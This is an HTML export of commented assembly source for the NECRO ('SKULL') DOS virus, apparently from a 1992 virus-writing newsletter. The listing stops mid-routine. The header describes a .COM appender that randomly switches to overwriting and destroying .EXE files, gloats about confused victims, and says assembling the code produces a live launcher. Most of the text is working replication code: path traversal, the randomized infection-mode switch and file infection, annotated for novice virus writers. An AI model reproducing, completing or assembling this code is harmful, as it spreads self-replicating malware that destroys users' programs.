<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; A86 SOURCE CODE for:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;          ++===================================================++</span><span class="sc0">
</span><span class="sc1">;          ||           NECRO (A.K.A. 'SKULL' virus)            ||</span><span class="sc0">
</span><span class="sc1">;          ||           The 666 byte Dual Replicator            ||</span><span class="sc0">
</span><span class="sc1">;          ||     DEC 1992 by Primal Fury, Lehigh Valley, PA    ||</span><span class="sc0">
</span><span class="sc1">;          ++===================================================++</span><span class="sc0">
</span><span class="sc1">;                   -=Prepared for Crypt Newsletter 11=-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Here's a virus that's actually two viruses in one.  The main virus is a</span><span class="sc0">
</span><span class="sc1">; a direct action, appending .COM infector.  It will search the system path</span><span class="sc0">
</span><span class="sc1">; for .COMs to infect, and may infect files on the path in preference to </span><span class="sc0">
</span><span class="sc1">; to those in the current directory (if no path is set, it stays in the</span><span class="sc0">
</span><span class="sc1">; current directory).  Roughly one out of every eight infections (on a ran-</span><span class="sc0">
</span><span class="sc1">; dom basis) will be non-standard.  In these infections, NECRO will toggle to </span><span class="sc0">
</span><span class="sc1">; an overwriting .EXE infector.  </span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">; This .EXE infector is composed of much of the same code as the </span><span class="sc0">
</span><span class="sc1">; COM infector -- the virus alternates between the two modes of infection </span><span class="sc0">
</span><span class="sc1">; using a 'master switch' which is hooked up to a simple randomization </span><span class="sc0">
</span><span class="sc1">; engine.  The master switch, when thrown, trips a series of auxilliary</span><span class="sc0">
</span><span class="sc1">; switches which alter the virus' behavior.  This saves on bytes and is </span><span class="sc0">
</span><span class="sc1">; therefore much better than having the virus drop an entirely independent</span><span class="sc0">
</span><span class="sc1">; .EXE overwriter.  I hope to expand upon this 'self-programming' concept</span><span class="sc0">
</span><span class="sc1">; in future viruses.</span><span class="sc0">
  
</span><span class="sc1">; Infected .COM's should function as intended after the viral code appended to </span><span class="sc0">
</span><span class="sc1">; them has finished doing its thing. But infected .EXE's are ruined.  These </span><span class="sc0">
</span><span class="sc1">; (provided they are under about 64K in length) will, when executed, pass </span><span class="sc0">
</span><span class="sc1">; their illness on to the next uninfected .EXE within the current directory, </span><span class="sc0">
</span><span class="sc1">; displaying the following graphic &amp; message:</span><span class="sc0">

</span><span class="sc1">;   ммллллллллмм           </span><span class="sc0">
</span><span class="sc1">; млллллВлллллллл        </span><span class="sc0">
</span><span class="sc1">;олВлллллллллллллн   You cant execute this file:         </span><span class="sc0">
</span><span class="sc1">;олллллВВлллп   л    Its already dead!           </span><span class="sc0">
</span><span class="sc1">; ллллллВВллмммлп          </span><span class="sc0">
</span><span class="sc1">;  ллллВВпВллллн           </span><span class="sc0">
</span><span class="sc1">;   ппллВВмоВлллн          </span><span class="sc0">
</span><span class="sc1">;           ВВннн              </span><span class="sc0">
 
</span><span class="sc1">; SKULL will then return the baffled user to the DOS prompt. I leave it to  </span><span class="sc0">
</span><span class="sc1">; your imagination to picture the consternation on the novice's face </span><span class="sc0">
</span><span class="sc1">; as he tries to isolate the source of this overwriting infection which </span><span class="sc0">
</span><span class="sc1">; seems to pop up again and again in different directories.  A very </span><span class="sc0">
</span><span class="sc1">; observant user may notice a file length increase of exactly 666 bytes in </span><span class="sc0">
</span><span class="sc1">; infected .COM's.  Infected .EXE's will not increase in length unless they  </span><span class="sc0">
</span><span class="sc1">; are less than ~200 bytes to begin with.  Note that overwritten .EXE's larger  </span><span class="sc0">
</span><span class="sc1">; than 64K will fail to load and will be non-infectious. Like Popoolar </span><span class="sc0">
</span><span class="sc1">; Science, the virus renders these programs into a .COM-like in structure. </span><span class="sc0">
</span><span class="sc1">; DOS will NOT execute these files.  In any case, the programs are ruined  </span><span class="sc0">
</span><span class="sc1">; by SKULL.  As of this release, NECRO avoids files that are read-only or </span><span class="sc0">
</span><span class="sc1">; hidden, so these files are be safe from the virus (for now...)</span><span class="sc0">
  
</span><span class="sc1">; CREDITS:  DARK ANGEL   --  for his COM infector replicatory code. (D.A.)  </span><span class="sc0">
</span><span class="sc1">;           NOWHERE MAN  --  for his VCL 1.0's path-searching routine. (N.M.)</span><span class="sc0">
</span><span class="sc1">;           </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">; Except where noted, I have commented the code with the novice </span><span class="sc0">
</span><span class="sc1">; programmer in mind.  In the places so noted, D.A.'s and N.M.'s com-</span><span class="sc0">
</span><span class="sc1">; ments, supplied from VCL 1.0 and PS-MPC assembly libraries, have been </span><span class="sc0">
</span><span class="sc1">; left intact.</span><span class="sc0">

</span><span class="sc1">; To assemble, use Isaacson's A86 to generate a .COMfile directly from</span><span class="sc0">
</span><span class="sc1">; this listing.  You will have a live NECRO launcher. MASM/TASM</span><span class="sc0">
</span><span class="sc1">; compatible assemblers will require the addition of a declarative pair.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Partial viral signature suitable for loading into TBScan's VIRSCAN.DAT,</span><span class="sc0">
</span><span class="sc1">; SCAN, or F-PROT 2.0x:</span><span class="sc0">
</span><span class="sc1">; [Necro]</span><span class="sc0">
</span><span class="sc1">; A9 01 00 74 29 E8 6A 00 8C C8 8E D8 8E C0 32 C0  </span><span class="sc0">

  
  </span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">     </span><span class="sc1">; jump to find_start</span><span class="sc0">
          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">Find_start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next</span><span class="sc0">              </span><span class="sc1">;common technique to allow virus to</span><span class="sc0">
  </span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                     </span><span class="sc1">;find its own code.  On exit, bp</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">        </span><span class="sc1">;points to start of code.</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stuff</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Prepare to restore orig. 3 bytes.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">               </span><span class="sc1">;push 100h, where all COMs start in</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">;memory, &amp; where control will be</span><span class="sc0">
                                         </span><span class="sc1">;returned to host file.</span><span class="sc0">
          </span><span class="sc6">movsw</span><span class="sc0">                          </span><span class="sc1">;restore the 3 bytes formerly relo-</span><span class="sc0">
          </span><span class="sc6">movsb</span><span class="sc0">                          </span><span class="sc1">;cated by the virus upon infection.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">;point DI to start of virus.</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;set new Disk Transfer Address, so</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_dta</span><span class="sc0">                </span><span class="sc1">;virus won't fuck up original.</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">search_files</span><span class="sc0">           </span><span class="sc1">;call path-search/infection routine.</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">quit</span><span class="sc0">                   </span><span class="sc1">;when done, return control to </span><span class="sc0">
                                         </span><span class="sc1">;host file.</span><span class="sc0">
          
  </span><span class="sc1">;Nowhere Man's VCL 1.0 path search routine, slightly modified for </span><span class="sc0">
  </span><span class="sc1">;compatibility with Dark Angel's code, and with 'master infection-mode </span><span class="sc0">
  </span><span class="sc1">;switch' added.  N.M.'s original comments have been retained for your </span><span class="sc0">
  </span><span class="sc1">;enlightenment.    </span><span class="sc0">

</span><span class="sc5">search_files</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; BX points to the virus</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">; Save BP</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pathstore</span><span class="sc4">],</span><span class="sc13">'\'  ;Start with a backslash
</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc0">                 </span><span class="sc1">; DOS get current dir function</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; DL holds drive # (current)</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pathstore</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SI points to 64-byte buffer</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">traverse_path</span><span class="sc0">           </span><span class="sc1">; Start the traversal</span><span class="sc0">

</span><span class="sc5">traversal_loop</span><span class="sc4">:</span><span class="sc0"> 
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">path_ad</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Was the search unsuccessful?</span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">done_searching</span><span class="sc0">          </span><span class="sc1">; If so then we're done</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">found_subdir</span><span class="sc0">            </span><span class="sc1">; Otherwise copy the subdirectory</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">; AX holds the code segment</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Set the data and extra</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; segments to the code segment</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; Zero AL</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; NULL-terminate the directory</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Bh</span><span class="sc0">                 </span><span class="sc1">; DOS change directory function</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pathstore</span><span class="sc4">+</span><span class="sc2">65</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DX points to the directory</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
                                                                    
          </span><span class="sc1">;The Master Switch, tied whimsically to the system clock:</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                  </span><span class="sc1">;DOS get system time.                      </span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;        </span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">                   </span><span class="sc1">;is 1/100th second &gt; 13?</span><span class="sc0">
          </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">call_infector</span><span class="sc0">           </span><span class="sc1">;if so, stay in COM infector</span><span class="sc0">
                                          </span><span class="sc1">;mode (the default).</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;throw switch for EXE infect.</span><span class="sc0">

          </span><span class="sc1">;back to Nowhere Man's code:</span><span class="sc0">

</span><span class="sc5">call_infector</span><span class="sc4">:</span><span class="sc0">  
          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_files</span><span class="sc0">              </span><span class="sc1">; Try to infect a file.</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">done_searching</span><span class="sc0">          </span><span class="sc1">; If successful, exit</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">traversal_loop</span><span class="sc0">    </span><span class="sc1">; Keep checking the PATH</span><span class="sc0">

</span><span class="sc5">done_searching</span><span class="sc4">:</span><span class="sc0"> 
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Bh</span><span class="sc0">                 </span><span class="sc1">; DOS change directory function</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pathstore</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; DX points to old directory</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">path_ad</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Did we run out of directories?</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">at_least_tried</span><span class="sc0">          </span><span class="sc1">; If not, exit</span><span class="sc0">
          </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">; Set carry flag for failure</span><span class="sc0">

</span><span class="sc5">at_least_tried</span><span class="sc4">:</span><span class="sc0"> 
          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">; Restore BP</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Return to caller</span><span class="sc0">

</span><span class="sc5">com_mask</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.COM"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Mask for all .COM files</span><span class="sc0">


</span><span class="sc5">traverse_path</span><span class="sc4">:</span><span class="sc0">   
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">002Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ES holds the enviroment segment</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; DI holds the starting offset</span><span class="sc0">

</span><span class="sc5">find_path</span><span class="sc4">:</span><span class="sc0">      
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ath_string</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; SI points to "PATH="</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; Load the "P" into AL</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">08000h</span><span class="sc0">               </span><span class="sc1">; Check the first 32767 bytes</span><span class="sc0">
          </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                   </span><span class="sc1">; Search until the byte is found</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; Check the next four bytes</span><span class="sc0">

</span><span class="sc5">check_next_4</span><span class="sc4">:</span><span class="sc0">   
          </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; Load the next letter of "PATH="</span><span class="sc0">
          </span><span class="sc6">scasb</span><span class="sc0">                           </span><span class="sc1">; Compare it to the environment</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_path</span><span class="sc0">               </span><span class="sc1">; If there not equal try again</span><span class="sc0">
          </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">check_next_4</span><span class="sc0">            </span><span class="sc1">; Otherwise keep checking</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">path_ad</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; Save the PATH address</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">path_ad</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">  </span><span class="sc1">; Save the PATH's segment</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Return to caller</span><span class="sc0">

</span><span class="sc5">ath_string</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PATH="</span><span class="sc0">           </span><span class="sc1">; The PATH string to search for</span><span class="sc0">
</span><span class="sc5">path_ad</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                 </span><span class="sc1">; Holds the PATH's address</span><span class="sc0">

</span><span class="sc5">found_subdir</span><span class="sc4">:</span><span class="sc0">    
          </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">path_ad</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS:SI points to PATH</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pathstore</span><span class="sc4">+</span><span class="sc2">65</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DI points to the work buffer</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">; Transfer CS into ES for</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; byte transfer</span><span class="sc0">

</span><span class="sc5">move_subdir</span><span class="sc4">:</span><span class="sc0">    
          </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; Load the next byte into AL</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">';'</span><span class="sc0">                  </span><span class="sc1">; Have we reached a separator?</span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">moved_one</span><span class="sc0">               </span><span class="sc1">; If so we're done copying</span><span class="sc0">
          </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; Are we finished with the PATH?</span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">moved_last_one</span><span class="sc0">          </span><span class="sc1">; If so get out of here</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; Store the byte at ES:DI</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">move_subdir</span><span class="sc0">       </span><span class="sc1">; Keep transfering characters</span><span class="sc0">

</span><span class="sc5">moved_last_one</span><span class="sc4">:</span><span class="sc0"> 
          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; Zero SI to signal completion</span><span class="sc0">

</span><span class="sc5">moved_one</span><span class="sc4">:</span><span class="sc0">      
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">path_ad</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">; Store SI in the path address</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Return to caller</span><span class="sc0">



  </span><span class="sc1">;O.K. -- Now here's an important 'architectural' point:  The following </span><span class="sc0">
  </span><span class="sc1">;code (down to the next inset) will never be executed within the COM </span><span class="sc0">
  </span><span class="sc1">;appender (that viral code jumps over it).  It will, however be the first </span><span class="sc0">
  </span><span class="sc1">;thing executed within overwritten EXE files.  Why?  Because in EXE infec-</span><span class="sc0">
  </span><span class="sc1">;tion mode, everything from EXFECT on down (but nothing previous) is </span><span class="sc0">
  </span><span class="sc1">;written over the beginning of the EXE host file.</span><span class="sc0">

  </span><span class="sc5">exfect</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next_two</span><span class="sc0">            </span><span class="sc1">;Here again we see the old trick</span><span class="sc0">
                                            </span><span class="sc1">;for pointing BP to start of  </span><span class="sc0">
  </span><span class="sc5">next_two</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">;viral code.  (possibly should</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">next_two</span><span class="sc0"> </span><span class="sc1">;have been subroutined [?]).</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">;throw master switch for EXE    </span><span class="sc0">
                                            </span><span class="sc1">;infection, so infection code</span><span class="sc0">
                                            </span><span class="sc1">;below knows to use that mode!</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;set DTA:  This would normally     </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_dta</span><span class="sc0">             </span><span class="sc1">;be utterly ridiculous (!) in an</span><span class="sc0">
                                            </span><span class="sc1">;overwriting virus but is used</span><span class="sc0">
                                            </span><span class="sc1">;here to maintain compatibility</span><span class="sc0">
                                            </span><span class="sc1">;with the infection code.      </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_files</span><span class="sc0">          </span><span class="sc1">;try to infect another EXE.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">prequit</span><span class="sc0">             </span><span class="sc1">;display message &amp; quit to DOS.</span><span class="sc0">

  </span><span class="sc1">;Now we're back to Dark Angel's code, expanded to save &amp; restore file </span><span class="sc0">
  </span><span class="sc1">;date/time-stamp, and of course to accomodate the new EXE overwriting code </span><span class="sc0">
  </span><span class="sc1">;and infection-mode 'switching system'.  This is where infection actually </span><span class="sc0">
  </span><span class="sc1">;takes place.</span><span class="sc0">

  </span><span class="sc5">find_files</span><span class="sc4">:</span><span class="sc0">   
          
          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                </span><span class="sc1">;for compatibility with path-search.         </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4eh</span><span class="sc0">           </span><span class="sc1">;phunction phor phinding phirst phile </span><span class="sc0">
                                    </span><span class="sc1">;that phits phile-mask.</span><span class="sc0">
  </span><span class="sc5">tryanother</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">com_mask</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;by default, look for a .COM extension. </span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">             </span><span class="sc1">;is the EXE infector switch thrown?</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">look</span><span class="sc0">        </span><span class="sc1">;if not go on, else qeue up '*.EXE' mask</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exemask</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;in place of '*.COM'.  </span><span class="sc0">

  </span><span class="sc5">look</span><span class="sc4">:</span><span class="sc0">    
